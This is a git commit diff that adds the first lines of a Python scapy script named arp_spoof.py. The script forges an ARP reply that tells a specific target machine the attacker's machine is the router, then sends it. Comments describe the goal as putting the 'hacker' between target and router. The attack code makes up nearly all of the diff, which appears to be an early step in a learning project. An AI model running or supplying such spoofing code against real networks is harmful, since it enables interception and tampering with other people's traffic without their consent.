442f06dfc67279544e6dc79ce1dc2387db78d46b
Maksym Lytvynchuk <lytvynchuk.official@gmail.com>
2019-08-04 12:45:50 +0300

    create packet

--- arp_spoofing/arp_spoof.py
+++ arp_spoofing/arp_spoof.py
@@ -1,3 +1,9 @@
 import scapy.all as scapy
-
-packet = scapy.ARP(op=2)
+# We will be getting data from user as we are router
+# Simple behaviour: target -> router
+# Our attack: target -> hacker -> router
+# psrc - our router ip
+# pdst - target ip
+# hwdst - target mac address
+packet = scapy.ARP(op=2, pdst="192.168.1.101", hwdst="f4:37:b7:d0:36:cd", psrc="192.168.1.1")
+scapy.send(packet)
